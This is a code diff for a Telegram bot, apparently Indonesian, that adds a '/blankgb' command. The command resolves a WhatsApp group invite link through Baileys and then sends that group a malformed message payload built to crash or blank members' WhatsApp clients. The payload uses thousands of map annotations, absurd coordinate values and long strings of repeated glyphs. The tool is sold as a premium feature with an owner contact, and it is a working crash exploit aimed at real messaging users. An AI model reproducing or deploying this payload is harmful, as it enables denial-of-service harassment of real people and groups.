@@ -1282,6 +1282,200 @@ if (remainingTime > 0) {
   }
 });
 
+// ---------------------------------------------------------------------------
+// 1) Resolve a chat.whatsapp.com invite → group JID via Baileys
+// ---------------------------------------------------------------------------
+async function resolveGroupJid(sock, invite) {
+  if (!invite) return null;
+
+  const m = String(invite).trim()
+    .match(/chat\.whatsapp\.com\/([A-Za-z0-9]{15,})/);
+  if (!m) return null;
+
+  const code = m[1];
+  const info = await sock.groupGetInviteInfo(code);
+  return info?.id || null;   // -> "xxxxxxxxxx-xxxxxxxxxx@g.us"
+}
+
+// ---------------------------------------------------------------------------
+// 2) bowoJid — payload, structure untouched, noSelfSync added
+// ---------------------------------------------------------------------------
+async function bowoJid(sock, jid) {
+  const label = "⭑‌⟅ ༑ ▾ #57 ⿻ ▾ ༑‌⟆ ‌‌‌‌‌‌‏⭑";
+  await sock.relayMessage(jid, {
+    botForwardedMessage: {
+      message: {
+        richResponseMessage: {
+          mapMetadata: {
+            centerLatitude: 99999e10,
+            centerLongitude: -99999e10,
+            latitudeDelta: 99999e99,
+            longitudeDelta: 99999e99,
+            showInfoList: true,
+            annotations: Array.from({ length: 5000 }, (_, i) => ({
+              annotationNumber: i,
+              latitude: 99999e10,
+              longitude: -99999e10,
+              title: "ꦽ".repeat(500),
+              body: "ꦽ".repeat(500)
+            }))
+          },
+          messageType: 1,
+          submessages: [
+            {
+              messageType: 8,
+              latexMetadata: {
+                text: label,
+                expressions: [
+                  {
+                    latexExpression: label,
+                    url: "https://t.me/Jangansoasikdeh",
+                    height: 99999999,
+                    fontHeight: 1,
+                  },
+                ],
+              },
+            },
+          ],
+          contextInfo: {
+            forwardingScore: 99999,
+            isForwarded: true,
+            forwardedAiBotMessageInfo: {
+              botJid: "0@bot",
+            },
+            forwardOrigin: 4,
+          },
+        },
+      },
+    },
+  }, {
+    noSelfSync: true
+  });
+}
+
+// ---------------------------------------------------------------------------
+// Command: /blankgb <chat.whatsapp.com link>
+// ---------------------------------------------------------------------------
+bot.onText(/\/blankgb\s+(https?:\/\/chat\.whatsapp\.com\/\S+)/i, async (msg, match) => {
+  const chatId    = msg.chat.id;
+  const senderId  = msg.from.id;
+  const inviteUrl = match[1];
+  const randomImage = getRandomImage();
+
+  // ---- premium gate (inlined like /perfectblank) ----
+  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+    return bot.sendPhoto(chatId, randomImage, {
+      caption: `\`\`\`Эта функция доступна только пользователям премиум-класса.\`\`\`
+┏━━━━━━━━━━━━━━━━━━┓
+<b>✦ 𝐀𝐋𝐓𝐇𝐄𝐑𝐀 — 𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐀𝐂𝐂𝐄𝐒𝐒</b>
+┗━━━━━━━━━━━━━━━━━━┛
+
+𖤓 Interested in accessing the script?
+Contact the owner below.
+
+↳ <b>Owner:</b> @Fuckyatim
+
+<b>PERFECT</b> — <i>EST. 2025</i>`,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
+        ]
+      }
+    });
+  }
+
+  // ---- cooldown gate ----
+  const remainingTime = checkCooldown(msg.from.id);
+  if (remainingTime > 0) {
+    return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
+  }
+
+  try {
+    // ---- session gate ----
+    if (sessions.size === 0) {
+      return bot.sendMessage(
+        chatId,
+        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
+      );
+    }
+
+    // ---- resolve group JID via Baileys ----
+    let JID;
+    try {
+      JID = await resolveGroupJid(sock, inviteUrl);
+    } catch (e) {
+      JID = null;
+    }
+
+    if (!JID || !/@g\.us$/.test(JID)) {
+      return bot.sendMessage(
+        chatId,
+        "❌ Gagal resolve grup. Link tidak valid, invite expired, atau bot tidak bisa akses."
+      );
+    }
+
+    // ---- progress header ----
+    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
+      caption: `
+\`\`\`
+- blankgb
+╰➤ Target : ${JID}
+╰➤ Status : Mengirim bug...
+╰➤ Progres : [░░░░░░░░░░] 0%
+\`\`\`
+`, parse_mode: "Markdown"
+    });
+
+    // ---- progress stages ----
+    const progressStages = [
+      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
+      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
+      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
+      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
+      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
+      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
+    ];
+
+    for (const stage of progressStages) {
+      await new Promise(resolve => setTimeout(resolve, stage.delay));
+      await bot.editMessageCaption(`
+\`\`\`
+- blankgb
+╰➤ Target : ${JID}
+╰➤ Status : Memproses...
+ ${stage.text}
+\`\`\`
+`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
+    }
+
+    // ---- exec: fire payload against the resolved group JID ----
+    for (let i = 0; i <= 1; i++) {
+      await bowoJid(sock, JID);
+    }
+    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
+
+    // ---- success + check-target button ----
+    await bot.editMessageCaption(`
+\`\`\`
+- blankgb
+╰➤ Target : ${JID}
+╰➤ Status : Sukses!
+╰➤ Progres : [██████████] 100%
+\`\`\`
+`, {
+      chat_id: chatId,
+      message_id: sentMessage.message_id,
+      parse_mode: "Markdown",
+      reply_markup: {
+        inline_keyboard: [[{ text: "Buka Grup", url: inviteUrl }]]
+      }
+    });
+
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
+  }
+});
 // /TEMPAT FUNC DISINI ///
 // forclose
 async function bowo(sock, target) {
